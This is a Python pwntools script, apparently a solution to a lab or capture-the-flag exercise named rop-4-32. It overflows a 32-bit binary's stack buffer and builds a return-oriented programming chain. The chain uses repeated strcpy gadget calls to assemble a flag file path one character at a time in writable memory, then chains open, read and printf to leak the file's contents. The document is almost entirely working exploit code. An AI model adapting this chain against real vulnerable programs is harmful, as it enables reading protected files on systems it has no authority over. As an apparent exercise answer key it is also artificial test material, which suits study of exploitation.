#!/usr/bin/env python
from pwn import *

p = process("./rop-4-32")

open_func = p.elf.symbols['open']
read_func = p.elf.symbols['read']
print_func = p.elf.symbols['printf']
strcpy = p32(0x0804858e)
pop_2 = p32(0x0804873a)
src = 0x8048768
src2 = 0x8048798
dest = 0x804a800

"""
building /home/labs/week5/rop-4-32/flag
"""

aslash = p32(0x80487e0)
lh = p32(src + 1)
lo = p32(src + 12)
lm = p32(src + 22)
le = p32(src + 2)
ll = p32(src + 35)
la = p32(src + 36)
lb = p32(src + 10)
ls = p32(src + 24)
lw = p32(src + 13)
lk = p32(src + 8)
lr = p32(src + 11)
lp = p32(src + 23)
lf = p32(src + 16)
lg = p32(src + 42)
num5 = p32(src2 + 29)
num4 = p32(src2 + 28)
num3 = p32(src2 + 27)
num2 = p32(src2 + 26)
dash = p32(src2 + 35)
nullterm = p32(src + 44)

buf = "A" * 0x88 + "BBBB"

buf += strcpy
buf += pop_2
buf += p32(dest)
buf += aslash

buf += strcpy
buf += pop_2
buf += p32(dest + 1)
buf += lh

buf += strcpy
buf += pop_2
buf += p32(dest + 2)
buf += lo

buf += strcpy
buf += pop_2
buf += p32(dest + 3)
buf += lm

buf += strcpy
buf += pop_2
buf += p32(dest + 4)
buf += le

buf += strcpy
buf += pop_2
buf += p32(dest + 5)
buf += aslash

buf += strcpy
buf += pop_2
buf += p32(dest + 6)
buf += ll

buf += strcpy
buf += pop_2
buf += p32(dest + 7)
buf += la

buf += strcpy
buf += pop_2
buf += p32(dest + 8)
buf += lb

buf += strcpy
buf += pop_2
buf += p32(dest + 9)
buf += ls

buf += strcpy
buf += pop_2
buf += p32(dest + 10)
buf += aslash

buf += strcpy
buf += pop_2
buf += p32(dest + 11)
buf += lw

buf += strcpy
buf += pop_2
buf += p32(dest + 12)
buf += le

buf += strcpy
buf += pop_2
buf += p32(dest + 13)
buf += le

buf += strcpy
buf += pop_2
buf += p32(dest + 14)
buf += lk

buf += strcpy
buf += pop_2
buf += p32(dest + 15)
buf += num5

buf += strcpy
buf += pop_2
buf += p32(dest + 16)
buf += aslash

buf += strcpy
buf += pop_2
buf += p32(dest + 17)
buf += lr

buf += strcpy
buf += pop_2
buf += p32(dest + 18)
buf += lo

buf += strcpy
buf += pop_2
buf += p32(dest + 19)
buf += lp

buf += strcpy
buf += pop_2
buf += p32(dest + 20)
buf += dash

buf += strcpy
buf += pop_2
buf += p32(dest + 21)
buf += num4

buf += strcpy
buf += pop_2
buf += p32(dest + 22)
buf += dash

buf += strcpy
buf += pop_2
buf += p32(dest + 23)
buf += num3

buf += strcpy
buf += pop_2
buf += p32(dest + 24)
buf += num2

buf += strcpy
buf += pop_2
buf += p32(dest + 25)
buf += aslash

buf += strcpy
buf += pop_2
buf += p32(dest + 26)
buf += lf

buf += strcpy
buf += pop_2
buf += p32(dest + 27)
buf += ll

buf += strcpy
buf += pop_2
buf += p32(dest + 28)
buf += la

buf += strcpy
buf += pop_2
buf += p32(dest + 29)
buf += lg

buf += strcpy
buf += pop_2
buf += p32(dest + 30)
buf += nullterm

buf += p32(open_func)
buf += p32(0x08048739)
buf += p32(dest)
buf += p32(0)
buf += p32(0)
buf += p32(read_func)
buf += p32(0x08048739)
buf += p32(3)
buf += p32(0x804a100)
buf += p32(100)
buf += p32(print_func)
buf += pop_2
buf += p32(0x804a100)
buf += p32(0)

p.sendline(buf)
p.interactive()
